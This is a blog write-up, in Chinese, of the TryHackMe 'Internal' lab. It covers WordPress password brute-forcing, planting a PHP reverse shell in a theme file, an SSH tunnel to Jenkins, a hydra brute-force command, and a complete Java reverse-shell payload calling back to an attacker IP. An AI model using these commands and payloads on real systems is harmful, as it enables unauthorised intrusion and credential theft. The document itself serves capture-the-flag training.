---
title: "THM Internal"
description: "TryHackMe篇之Internal"

date: 2024-10-07T12:37:32+08:00
lastmod: 2025-11-11T11:06:59+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.27.141

# 写在前面

![image-20241007125005114](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125007253-1199614277.png)

要将`internal.thm`添加到`/etc/hosts` 文件中

![image-20241007125107606](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125108994-1194412670.png)

# 信息收集

## nmap扫描

`nmap --min-rate 10000 -sS -sV -sC 10.10.27.141 -oN reports/nmap`

![image-20241007125127613](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125129049-1554175018.png)

发现开放22端口和80端口

## 80端口

![image-20241007125453302](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125454844-2082201762.png)

是一个`apache`的初始页面，扫描一下目录

 `gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirb/common.txt`

![image-20241007125550493](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125552143-1556052638.png)

访问一下

* `/blog`

![image-20241007125734839](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125736845-1392160763.png)

* `/javascript`

![image-20241007125745983](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125747452-224993723.png)

* `/phpmyadmin`

![image-20241007125755191](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125756599-644411919.png)

* `/wordpress`

![image-20241007125806157](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007125807763-1396057649.png)

不难看出，这是一个`wordpress`的界面，`wordpress`和`blog`是一个页面，这里以`/blog`为主，同时还有个`phpMyAdmin`

# 获取初始shell

## 登录wordpress

先看下`phpMyAdmin`

![image-20241007130432070](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007130433898-1261641608.png)

查看源码发现版本号是`4.6.6`，通过`searchsploit`搜索后发现没有什么可以利用的，将注意力转移到`wordpress`

使用`wpscan`扫描一下

`wpscan --url http://internal.thm/blog/ -e`

![image-20241007132505372](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007132506908-1533969406.png)



发现有个admin账户，尝试破解一下密码

`wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt`

![image-20241007133732602](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007133734282-1690665278.png)

爆破成功，找到了`admin`账户的密码`my2boys `

![image-20241007133909433](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007133911002-255471056.png)

成功登录

## shell获取

![image-20241007134755947](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007134757805-2134124194.png)

在这里发现可以随意更改文件内容。这里将`404.php`内容改成反弹shell的文件是[php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)，修改`ip`和`port`

![image-20241007135147307](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007135148884-1540858205.png)

点击下买你的更新文件。然后在kali上创建监听

![image-20241007135221038](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007135222394-569063211.png)

现在需要找到`404.php`文件的位置，从路由中可以看到主题是`twentyseventeen`，而且大多数主题位于`wp-content` 目录下，主题位于`/wp-content/themes`目录下，所以`404.php`文件的位置是：`/wp-content/themes/twentyseventeen/404.php`

访问文件`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

![image-20241007135719154](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007135720735-27264363.png)

![image-20241007135736972](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007135738379-51772723.png)

这样我们就拿到了低权用户的shell

先获取交互式shell

`python -c 'import pty;pty.spawn("/bin/bash")'`

![image-20241007135934513](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007135936004-77642626.png)

![image-20241007140014508](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007140015991-900638678.png)

在`/home`目录下有个`aubreanna`用户，现在目标就是提升至user权限

# 提升至user权限

![image-20241007140609325](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007140610859-829745507.png)

在翻阅目录的过程中发现在 `/opt`目录下有个`wp-save.txt`文件，并且这是我们可以查看的文件，查看一下

![image-20241007140727188](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007140728583-62091955.png)

得到了`aubreanna`用户的密码`bubb13guM!@#123`，登录`aubreanna`用户

![image-20241007140835640](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007140837240-798440971.png)

成功登录

![image-20241007140900121](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007140901515-1447831069.png)

在`/home/aubreanna`下找到`user.txt`

# 提升至root权限

发现在这个目录还有`jenkins.txt`文件，查看一下

![image-20241007141129333](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007141130806-1153980717.png)

告诉我们内网`Jenkins`服务的地址是`172.17.0.2:8080`

先简单看一下服务

`curl http://172.17.0.2:8080`

![image-20241007141310725](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007141312485-108597353.png)

由于目标机器的端口`8080`只能通过目标机的本地进行访问，所以我们需要设置SSH端口转发，从而将目标机器`8080`端口上的流量重定向到我们本地攻击机上的地址和端口`localhost:8081`，在攻击机上的终端界面构造如下命令

```bash
ssh -f -N -L 8081:172.17.0.2:8080 aubreanna@internal.thm
#根据前述结果，登录密码为：bubb13guM!@#123
#ssh端口转发(本地网卡地址0.0.0.0可省略)：HostB$ ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC
#参数说明
#-C：压缩数据
#-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。
#-N ：不执行脚本或命令，通常与-f连用。
#-g ：在-L/-R/-D参数中，允许远程主机连接到建立转发的端口，如果不加这个参数，只允许本地主机建立连接。
#-L : 本地隧道，本地端口:目标IP:目标端口
#-D : 动态端口转发
#-R : 远程隧道
#-T ：不分配 TTY 只做代理用
#-q ：安静模式，不输出 错误/警告 信息
```

![image-20241007143026526](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007143027902-1109898380.png)

输入密码后即可访问服务

![image-20241007143013118](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007143014999-1246675905.png)

网上的默认密码无法登录，这里使用`hydra`暴力破解，先找到登录框的表单内容

![image-20241007144305568](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007144307417-1663244639.png)

找到后就可以构造命令了

```bahs
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8081 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"

#"/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password"
```

![image-20241007145153970](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145155569-23242268.png)

成功爆破出密码`spongebob`

![image-20241007145244248](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145245979-419572187.png)

成功登录！

![image-20241007145413172](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145414836-343618295.png)

在管理界面，有一个可以执行命令的地方，在攻击机先建立监听

![image-20241007145512664](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145514017-720666410.png)

然后再执行反弹shell的命令

```java
String host="10.11.101.220";
int port=8889;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![image-20241007145625573](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145627071-645137157.png)

![image-20241007145647641](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145649065-1090977695.png)

拿到`jenkins`的shell

转到交互式shell

`python -c 'import pty;pty.spawn("/bin/bash")'`

![image-20241007145817874](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145819229-990567029.png)

依旧是在老位置`/opt`下找到`note.txt`

![image-20241007145853700](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007145855094-105871939.png)

得到`root`用户的密码：`tr0ub13guM!@#123`

直接`ssh`登录`root`

`ssh root@10.10.27.141`

![image-20241007150056965](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007150058524-1354823152.png)

成功登录

![image-20241007150119151](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241007150120478-264508902.png)

在当前目录找到`root.txt`